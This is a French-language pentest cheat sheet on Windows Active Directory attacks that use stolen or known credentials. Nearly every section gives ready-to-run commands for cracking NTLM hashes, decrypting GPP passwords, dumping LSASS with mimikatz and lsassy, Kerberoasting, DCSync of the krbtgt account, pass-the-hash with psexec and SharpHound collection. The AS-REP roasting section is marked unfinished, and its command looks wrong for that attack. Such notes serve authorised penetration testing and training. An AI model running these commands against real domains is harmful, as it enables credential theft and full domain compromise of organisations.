# Attaques Windows avec identifiants

## 1. Obtention d'identifiants / hash NTLM

### 1.1. Cracking

> Entrée : Hash Net-NTLMv2 obtenu au préalable
>
> Objectif : Obtenir le mot de passe de l'utilisateur

```bash
$ john --format=netntlmv2 --wordlist="/usr/share/wordlists/rockyou.txt" hash.txt

$ hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```



### 1.2. MS14-025 (GPO)

> **SYSVOL** est un partage réseau regroupant entre autre les éléments qui doivent être accessibles pour l’ensemble des ordinateurs du domaine (e.g. scripts de connexion, GPO, …). Il se situe sur les controleurs de domaine.
>
> Entrée : Accès à un partage SYSVOL sur la machine <IP> (compte du domaine)
>
> Objectif : Obtenir le mot de passe de l'utilisateur utilisé pour appliquer la GPO (généralement l'administrateur local)

```bash
# Connexion au préalable sur le partage SMB SYSVOL
$ cd \DOMAIN\Policies\{UNE-CLE-GPO}\Machine\Preferences\Groups\
$ cat Groups.xml
$ gpp-decrypt <HASHED_PASSWORD>

# Ou plus facile, utilisation du module gpp_password CME
$ cme smb <IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
```



### 1.3 Dump LSASS

> Récupération des hash NTLM des comptes s'étant connectés sur la machine
>
> Entrée : compte administrateur local d'une machine cliente
>
> Objectifs : récupérer un hash HTLM d'un compte du domaine

```bash
# A distance
$ crackmapexec smb <IP_PARTAGE> -u USERNAME -p PASSWORD -M lsassy 

# Si déjà connecté sur le poste client
C:\> .\mimikatz.exe 
```





## 2. Exploitation avec identifiants / hash NTLM

### 2.1 Exploitation des partages réseau

#### 2.1.1 Listing des partages réseaux SMB

> Entrée : Identifiants d'un utilisateur / hash NTLM si le partage est sur le DC
>
> Objectifs : lister les partages réseaux SMB présents sur une machine <IP>

```bash
# Sur une machine cliente
$ crackmapexec smb <IP_CLIENT> -u "USERNAME" -p 'PASSWORD' --shares --local-auth

# Sur un contrôleur de domaine
$ crackmapexec smb <IP_DC> -u "USERNAME" -H <HASH_NTLM> --shares
```

- Si utilisation d'un compte local, spécifier l'option --local-auth ;

- CME vient confirmer les identifiants utilisés et indique la mention "Pwn3d!" si c'est un compte ayant les droits d'un **administrateur local**. Si c'est un compte du domaine, il l'indique en vert.

  

#### 2.1.2 Accès aux partages réseaux SMB

> Entrée : Identifiants d'un utilisateur / hash NTLM si le partage est sur le DC
>
> Objectifs : accéder et lire les fichiers présents sur les partages réseau SMB

```bash
# Sur une machine client
$ impacket-smbclient 'USERNAME:PASSWORD@<IP_CLIENT>'

# Sur un contrôleur de domaine
$ impacket-smbclient -hashes :<HASH_NTLM> DOMAIN/USERNAME@<IP_DC>     
```

Voir [smbclient](./smclient.md) pour consulter les actions réalisables



### 2.2 Attaques liées au compte de service

#### 2.2.1 Kerberoasting

> Entrée : Compte utilisateur avec le droit d'utiliser le service
>
> Objectif : Récupérer un TGS (ticket signé avec le mot de passe du compte de service) pour le cracker et obtenir le mot de passe du compte de service

```bash
$ impacket-GetUserSPNs -request -dc-ip <IP_DC> 'DOMAIN/USERNAME:PASSWORD'
```



#### 2.2.2 ASREP Roasting (WIP)

> Se base sur la possibilité de demander un ticket de service en tant qu'un utilisateur du domaine sans connaître son mot de passe.
>
> Entrée : Connaissance du compte de service dont on veut un ticket / paramétrage de l'utilisateur de domaine "pas de pré-authentification Kerberos"
>
> Objectif : Récupérer un TGT pour le cracker et obtenir le mot de passe du compte de service

```bash
$ impacket-GetUserSPNs 'DOMAIN/USERNAME' -no-pass
```



#### 2.2.3 DCSync

> Se base sur le fait qu'un compte de service ait les droits de répliquer les modifications d'un annuaire (i.e. synchronisation de tout l'annuaire)
>
> Entrée : Compte de service avec les droits DCSync
>
> Objectif (court) : Devenir administrateur du domaine (Administrateur ou KRBTGT)
>
> Objectif (long) : Répliquer l'annuaire pour ensuite lire les modifications du fichier NTDS.dit et donc récupérer tous les hash des utilisateurs du domaine, dont l'administrateur du domaine

```bash
$ impacket-secretsdump 'DOMAINE/USERNAME:PASSWORD@<IP_DC>' -just-dc-user krbtgt
```



### 2.3 Autre

#### 2.3.1 Connexion sur un poste distant

> Entrée : Identifiants d'un utilisateur / hash NTLM
>
> Objectifs : exécuter des commandes sur le serveur / lire des fichiers / dump LSASS / etc.
>
> Autre objectif : si la machine cliente est relié à l'AD, lancer SharpHound pour utiliser BloodHound

```bash
# Sur une machine client
$ impacket-psexec 'USERNAME:PASSWORD@<IP_CLIENT>'
# Hash LM vide : aad3b435b51404eeaad3b435b51404ee / Remplacer par hash LM s'il y en a un
$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<HASH_NT> 'USERNAME@<IP_CLIENT>'
```



#### 2.3.2 SharpHound 

> Entrée : Connexion sur un poste distant du domaine
>
> Objectif : Extraire les informations de l'annuaire pour ensuite élaborer des chemins de compromissions via BloodHound

```powershell
# Génère un fichier à donner en entrée à BloodHound
C> SharpHound.exe --outputdirectory C:\ --CollectionMethod All
```

